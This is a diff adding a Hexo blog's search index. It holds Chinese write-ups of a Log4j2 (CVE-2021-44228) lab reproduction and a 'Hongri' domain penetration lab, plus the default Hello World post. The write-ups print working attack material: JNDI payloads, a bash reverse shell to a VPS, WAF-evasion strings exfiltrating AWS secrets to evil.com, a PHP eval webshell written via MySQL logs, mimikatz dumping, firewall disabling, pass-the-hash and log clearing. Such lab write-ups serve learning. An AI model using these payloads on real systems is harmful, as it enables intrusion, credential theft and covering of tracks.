@@ -1,0 +1,344 @@
+<?xml version="1.0" encoding="utf-8"?>
+<search>
+  <entry>
+    <title>cve-2021-44228-Log4j2</title>
+    <url>/post/f9f48cab.html</url>
+    <content><![CDATA[<h1 id="cve-2021-44228-Log4j2"><a href="#cve-2021-44228-Log4j2" class="headerlink" title="cve-2021-44228-Log4j2"></a>cve-2021-44228-Log4j2</h1><blockquote>
+<p>利用到的工具</p>
+<ul>
+<li><p>JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</p>
+</li>
+<li><p>JNDIExploit-2.0-SNAPSHOT.jar</p>
+<p>一台vps</p>
+</li>
+</ul>
+</blockquote>
+<h2 id="IwaAp">log4j2</h2>
+<h3 id="Lee0K">cve-2021-44228</h3>
+<h4 id="h1mce">利用</h4>
+##### 探测是否存在漏洞
+
+<p>先获取一个DNS的地址</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#探测是否存在漏洞</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">123.7</span>k8ovf.ceye.io&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#获取版本</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="variable">$</span>&#123;sys:java.version&#125;.<span class="number">7</span>k8ovf.ceye.io&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/1.png"></p>
+<p><img src="/img/cve-2021-44228-Log4j2/2.png"></p>
+<p>dns平台回显</p>
+<p><img src="/img/cve-2021-44228-Log4j2/3.png"></p>
+<p>java版本为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.8.0_312</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h5><p>在vps开个监听</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">nc <span class="literal">-lvnp</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/4.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">bash <span class="literal">-i</span> &gt;&amp; /dev/tcp/<span class="number">47.113</span>.<span class="number">229.136</span>/<span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/cve-2021-44228-Log4j2/5.png"></p>
+<p>YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE&#x3D;</p>
+<p>base64编码一下</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">java <span class="literal">-jar</span> JNDI<span class="literal">-Injection-Exploit-1</span>.<span class="number">0</span><span class="literal">-SNAPSHOT-all</span>.jar <span class="literal">-C</span> <span class="string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80Ny4xMTMuMjI5LjEzNi80NDQ0IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span> <span class="literal">-A</span> <span class="string">&quot;47.113.229.136&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/6.png"></p>
+<p>由于版本为1.8</p>
+<p>所以选择</p>
+<p>ldap:&#x2F;&#x2F;47.113.229.136:1389&#x2F;hozkka</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/hozkka&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/7.png"></p>
+<p>记得把服务器的安全组规则弄一下</p>
+<p>端口开放一下</p>
+<p><img src="/img/cve-2021-44228-Log4j2/8.png"></p>
+<p>应该能弹shell成功的 但是太卡了</p>
+<p>这里是用的在线靶场</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">47.113</span>.<span class="number">229.136</span>:<span class="number">1389</span>/TomcatBypass/TomcatEcho&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /hello?payload=%<span class="number">24</span>%<span class="number">7</span>b%<span class="number">6</span>a%<span class="number">6</span>e%<span class="number">64</span>%<span class="number">69</span>%<span class="number">3</span>a%<span class="number">6</span>c%<span class="number">64</span>%<span class="number">61</span>%<span class="number">70</span>%<span class="number">3</span>a%<span class="number">2</span>f%<span class="number">2</span>f%<span class="number">34</span>%<span class="number">37</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">31</span>%<span class="number">33</span>%<span class="number">2</span>e%<span class="number">32</span>%<span class="number">32</span>%<span class="number">39</span>%<span class="number">2</span>e%<span class="number">31</span>%<span class="number">33</span>%<span class="number">36</span>%<span class="number">3</span>a%<span class="number">31</span>%<span class="number">33</span>%<span class="number">38</span>%<span class="number">39</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">42</span>%<span class="number">79</span>%<span class="number">70</span>%<span class="number">61</span>%<span class="number">73</span>%<span class="number">73</span>%<span class="number">2</span>f%<span class="number">54</span>%<span class="number">6</span>f%<span class="number">6</span>d%<span class="number">63</span>%<span class="number">61</span>%<span class="number">74</span>%<span class="number">45</span>%<span class="number">63</span>%<span class="number">68</span>%<span class="number">6</span>f%<span class="number">7</span>d HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">20060</span></span><br><span class="line">Upgrade<span class="literal">-Insecure-Requests</span>: <span class="number">1</span></span><br><span class="line">User<span class="literal">-Agent</span>: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">134.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*/*;q=<span class="number">0.8</span>,application/signed<span class="literal">-exchange</span>;v=b3;q=<span class="number">0.7</span></span><br><span class="line">Referer: http://<span class="number">123.58</span>.<span class="number">224.8</span>:<span class="number">11324</span>/</span><br><span class="line">Accept<span class="literal">-Encoding</span>: gzip, deflate</span><br><span class="line">Accept<span class="literal">-Language</span>: zh<span class="literal">-CN</span>,zh;q=<span class="number">0.9</span></span><br><span class="line">cmd: <span class="built_in">ls</span> /tmp</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/cve-2021-44228-Log4j2/9.png"></p>
+<h4 id="o78IB">绕waf</h4>
+<h5 id="WCjBO">Log4j2混淆绕过waf/流量特征</h5>
+[Log4j一些WAF绕过技巧 - websec80 - 博客园](https://www.cnblogs.com/websec80/p/17876672.html)
+
+<h6 id="suFLP">利用 Lookup 语法变形</h6>
+1.可以使用 :- 进行一个截取和赋值的操作，因此我们可以用其来混淆流量，分隔关键字
+
+<blockquote>
+<p><code>:-</code> 的作用是用来指定一个默认值。当 lookup 函数找不到指定的变量或值时，它会返回 <code>:-</code> 后面指定的默认值。</p>
+</blockquote>
+<p>s[:::::-j)${what:-n}${ls:-d}${1QAZ2wxs:-i}</p>
+<p>${j${sdasd:-n}d${sddd:-i}:ldap:&#x2F;&#x2F;dns.log}</p>
+<h6 id="Q6StV">环境变量与系统属性注入</h6>
+**环境变量读取**：利用 `env` Lookup 动态构造 Payload，例如：
+
+<ul>
+<li>java复制</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;jndi:ldap://evil.com/z?leak=$&#123;env:AWS_SECRET_ACCESS_KEY&#125;&#125;</span><br><span class="line">$&#123;$&#123;env:ENV_NAME:-j&#125;ndi:$&#123;env:ENV_NAME:-l&#125;dap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过读取环境变量或动态拼接绕过静态检测7。</p>
+<p><strong>系统属性注入</strong>：利用 <code>sys</code> Lookup 构造动态协议：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;sys:SYS_NAME:<span class="literal">-i</span>&#125;:ldap://evil.com/z&#125;</span><br></pre></td></tr></table></figure>
+
+<p>若系统属性 <code>SYS_NAME</code> 不存在，则默认使用 <code>i</code> 补全7。</p>
+<p>2.虽然除了JNDI之外的核心包里的Lookup不能直接用来执行恶意代码，但是可以获取系统信息、环境变量、属性配置、JVM参数等等信息，这些信息可以被攻击者用来进行下一步操作</p>
+<h6 id="OJY3U">解析绕过</h6>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span><span class="comment">#evil.com/z&#125;  // 利用 `#` 分割主机名</span></span><br><span class="line"><span class="variable">$</span>&#123;jndi:ldap://<span class="number">127.0</span>.<span class="number">0.1</span>`/Exploit&#125;    // 使用反引号触发 URI 解析错误</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;payload&quot;</span>: <span class="string">&quot;<span class="variable">$</span>&#123;jnd<span class="variable">$</span>&#123;a&quot;</span>:<span class="string">&quot;a:-i&#125;:ld<span class="variable">$</span>&#123;&quot;</span>,</span><br><span class="line">  <span class="string">&quot;next&quot;</span>: <span class="string">&quot;o:-a&#125;p://evil.com/z&#125;&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <tags>
+        <tag>漏洞复现</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Hello World</title>
+    <url>/post/4a17b156.html</url>
+    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
+<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
+<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
+<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
+<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
+
+<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title>红日1</title>
+    <url>/post/633b4305.html</url>
+    <content><![CDATA[<h1 id="MsYgn">环境搭建</h1>
+安装好三台靶机
+
+
+
+<p>默认密码为</p>
+<p>hongrisec@2019</p>
+<p>配置两张网卡  NAT和vm1</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/1.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/2.png"></p>
+<p>查看网卡配置成功</p>
+<h2 id="vM2Iz">配置kali（vps）</h2>
+一张网卡，NAT模拟公网
+
+<p>192.168.5.129</p>
+<h2 id="t0xid">配置win7（web服务器跳板机）</h2>
+(NAT、VMnet1- 52.0/24)
+
+
+
+<p>改密码为hongrisec@2025</p>
+<p>首次登录成功后，需要进行重启，否则phpstudy可能启动不了</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/3.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/4.png"></p>
+<p>配置成功</p>
+<p>cmd检查一下，如果这里没显示两个不同网段的ip，那么就去修改网卡，直到成功为止</p>
+<p>这里注意 第一个网卡固定为192.168.52.0&#x2F;24</p>
+<p>所以将网卡2改为NAT以模拟外网</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/5.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/6.png"></p>
+<h2 id="cJu1g"><font style="color:rgb(79, 79, 79);">域内主机 Win2k3（VMnet3- 52.141）</font></h2>
+显示要修改密码
+
+<p>修改为hongrisec@2025</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/7.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/8.png"></p>
+<h2 id="qKUDT"><font style="color:rgb(79, 79, 79);">域控 </font><font style="color:rgb(78, 161, 219) !important;">Server</font><font style="color:rgb(79, 79, 79);"> 2008 R2（VMnet3 - 52.138）</font></h2>
+同样需要修改密码
+
+<p>修改为hongrisec@2025</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/9.png"></p>
+<h1 id="CaDm4">环境</h1>
+同下 配置成功
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/10.png"></p>
+<p>模拟外网网段：192.168.5.0&#x2F;24</p>
+<p>模拟内网网段：192.168.52.0&#x2F;24</p>
+<p>攻击机</p>
+<p>win11:192.168.5.1</p>
+<p>kali:192.168.5.129</p>
+<h1 id="SW3VX">信息收集</h1>
+`fs.exe -h 192.168.5.130-255`#这里这么扫是因为避开扫kali和物理机，正常应该为xxx.xxx.xxx.0/24
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/11.png"></p>
+<p>端口</p>
+<p>192.168.5.130:80 open</p>
+<p>192.168.5.130:3306 open</p>
+<p>[*] alive ports len is: 2</p>
+<p>start vulscan</p>
+<p>[*] WebTitle <a href="http://192.168.72.128/">http://192.168.72.128</a>     code:200 len:14749  title:phpStudy 探针 2014</p>
+<h1 id="uFaX0">外网打点</h1>
+访问80端口为phpinfo
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/12.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/13.png"></p>
+<p>尝试弱口令root和root，成功连接</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/14.png"></p>
+<p>使用工具直接连 连不上</p>
+<p>dirsearch 扫一下目录</p>
+<p>python dirsearch.py -u “<a href="http://10.10.0.101"/">http://192.168.5.130"</a></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/15.png"></p>
+<p>扫出来phpmyadmin</p>
+<p><a href="http://10.10.0.101/phpmyadmin/">http://192.168.5.130/phpmyadmin/</a></p>
+<p>直接访问，使用刚刚的弱口令登录成功</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/16.png"></p>
+<p>发现有个newyxcms的数据库</p>
+<p>phpmyadmin可以尝试写文件getshell</p>
+<hr>
+<p>前提条件:</p>
+<p>需要知道此网站的绝对路径</p>
+<p>此网站目录是否可写</p>
+<p>secure_file_priv没有值</p>
+<hr>
+<p><font style="color:rgb(0, 0, 0);">secure_file_priv是用来限制在那个目录下有读写权限的，再mysql 5.6.34版本后是默认NULL的，此mysql的版本为5.5.53并没有大于5.6.34 </font></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">当它的值为NULL时，则表示不允许进行读写</span><br><span class="line">当它的值为一个路径时(例如/tmp),则表示只能再/tmp目录下读写 </span><br><span class="line">当它没有值时，则表示没有限制</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/17.png"></p>
+<p>刚刚的探针显示了绝对路径</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">show variables like <span class="string">&quot;secure_file_priv&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><font style="color:rgb(30, 107, 184);"></font></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/18.png"></p>
+<p>执行发现思路断了</p>
+<p>再查看日志记录开启没</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/19.png"></p>
+<p>默认关闭，那我们执行命令开启</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables  like  &#x27;general_log&#x27;;   #可以查看日志的读写是否开启</span><br><span class="line"></span><br><span class="line">set global general_log = on;           #开启此功能</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/20.png"></p>
+<p><font style="color:rgb(0, 0, 0);">开启功能成功，将日志文件的地址改为web目录下的php文件</font></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">show variables  like  &#x27;general_log_file&#x27;;      </span><br><span class="line">#查看日志的默认路径</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">set global general_log_file=&#x27;C:\\phpStudy\\WWW\\shell.php&#x27;;         </span><br><span class="line">#修改路径修改完地址，直接通过select来写入一下</span><br></pre></td></tr></table></figure>
+
+<p>再次查询已经修改成功</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/21.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select &#x27;&lt;?php @eval($_REQUEST[1]);?&gt;&#x27;;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/22.png"></p>
+<p>哥斯拉也连接成功</p>
+<p>另一种方式</p>
+<p>那么前面还发现了yxcms</p>
+<p>fuzz一下，发现<a href="http://10.10.0.101/yxcms/">http://192.168.5.130/yxcms/</a></p>
+<p>能直接访问</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/23.png"></p>
+<p>并且从公告中发现了弱口令</p>
+<p><a href="http://10.10.0.101/yxcms//index.php?r=admin/index/login">http://10.10.0.101/yxcms//index.php?r=admin/index/login</a></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/24.png"></p>
+<p>由于是靶场 找到配置文件</p>
+<p>直接修改为一句话木马</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/25.png"></p>
+<p>蚁剑直接连</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/26.png"></p>
+<p>发现权限为管理员</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/27.png"></p>
+<p>那么接下来我们需要cs上线</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/28.png"></p>
+<p>admin权限，所以我们直接一键提权</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/29.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/30.png"></p>
+<h1 id="w1lkx">后渗透</h1>
+<h2 id="ZrJOi">内网信息收集</h2>
+ipconfig /all
+
+<p>查看到一个ip地址为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.143</font></p>
+<p>其dns服务器为<font style="color:rgb(238, 238, 238);background-color:rgb(0, 0, 0);">192.168.52.138</font></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/31.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/32.png"></p>
+<p>发现域控为owa.god.org</p>
+<p>ping一下，确定ip为192.168.52.138</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/33.png"></p>
+<p>然后再net view &#x2F;domain</p>
+<p>查看当前域,是存在GOD域的，既然有域，那么目标就清晰了，需要拿下域控</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/34.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/35.png"></p>
+<p>进行网络探测和端口扫描</p>
+<p>加上已控制的跳板机web，共有3台机</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/36.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/37.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">域用户</span><br><span class="line">administrator</span><br><span class="line">ligang</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">域机器</span><br><span class="line">OWA.god.org <span class="number">192.168</span>.<span class="number">52.138</span> 域控</span><br><span class="line">ROOT<span class="literal">-TVI862UBEH</span>.god.org <span class="number">192.168</span>.<span class="number">52.141</span> 域内机器</span><br><span class="line">stu1.god.org <span class="number">192.168</span>.<span class="number">52.143</span> 域内机器(已拿下)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>接下来先尝试拿下192.168.52.141</p>
+<h2 id="oSX4q">拿下域内主机</h2>
+
+<p>方法一</p>
+<p>上传mimikatz抓取密码(最好还是用蚁剑传，因为cs不是交互式)</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/38.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/39.png"></p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line"></span><br><span class="line">sekurlsa::logonPassword</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<p>或者方法二<img src="/img/%E7%BA%A2%E6%97%A51/40.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/41.png"></p>
+<p>然后开启3389端口和关闭防火墙</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="comment">#关闭防火墙</span></span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode disable      <span class="comment">#winsows server 2003 之前</span></span><br><span class="line">netsh advfirewall <span class="built_in">set</span> allprofiles state off  <span class="comment">#winsows server 2003 之后</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注册表开启3389端口</span></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d <span class="number">00000000</span> /f</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加防火墙规则</span></span><br><span class="line">netsh advfirewall firewall add rule name=<span class="string">&quot;Open 3389&quot;</span> <span class="built_in">dir</span>=<span class="keyword">in</span> action=allow protocol=TCP localport=<span class="number">3389</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E7%BA%A2%E6%97%A51/42.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/43.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/44.png"></p>
+<p>注意是god&#x2F;administrator</p>
+<p>已连上</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/45.png"></p>
+<p>下面是通过哈希传递攻击PTH拿下域控主机</p>
+<blockquote>
+<p><font style="color:rgb(0, 0, 0);">在域环境中，利用哈希传递攻击的渗透方式往往是这样的：</font></p>
+<p><font style="color:rgb(0, 0, 0);">1.获得一台域主机的权限，Dump 内存获得该主机的用户密码 Hash 值</font></p>
+<p><font style="color:rgb(0, 0, 0);">2.通过哈希传递攻击尝试登录其他主机</font></p>
+<p><font style="color:rgb(0, 0, 0);">3.继续搜集 Hash 并尝试远程登录，直到获得域管理员账户 Hash，登录域控，最终成功控制整个域</font></p>
+</blockquote>
+<p>前面就已经抓取过了</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/46.png"></p>
+<p>NTLM     : ad8b1b80e5d43bd61ab6796242bc7daa</p>
+<p>创建smb监听器</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/47.png"></p>
+<p>使用psexec进行横向</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/48.png"></p>
+<p>先横192.168.52.141吧</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/49.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/50.png"></p>
+<p>成功上线</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/51.png"></p>
+<p>重复操作</p>
+<p>拿下域控</p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/52.png"></p>
+<p><img src="/img/%E7%BA%A2%E6%97%A51/53.png"></p>
+<p>痕迹清理</p>
+<p>win7</p>
+<p>wevtutil cl system 清除系统日志<br>wevtutil cl application 清除应用程序日志<br>wevtutil cl security 清除安全日志<br>netsh interface portproxy show all 查看转发的端口情况<br>netsh interface portproxy delete v4tov4 listenaddress&#x3D;192.168.52.143 listenport&#x3D;5557 清理转发的端口</p>
+<p><a href="https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA">https://mp.weixin.qq.com/s/UKbUQkVkl3aNJ9NCN4IngA</a></p>
+<h1 id="fDJqT">总结</h1>
+![](/img/红日1/54.png)
+
+<ol>
+<li>整理一下<font style="color:#000000;background-color:rgba(255, 255, 255, 0);">phpmyadmin的getshell方法</font></li>
+<li><font style="color:#000000;background-color:rgba(255, 255, 255, 0);">简单熟悉了一下工具的使用和环境的搭建</font></li>
+</ol>
+]]></content>
+      <tags>
+        <tag>靶机渗透</tag>
+      </tags>
+  </entry>
+</search>
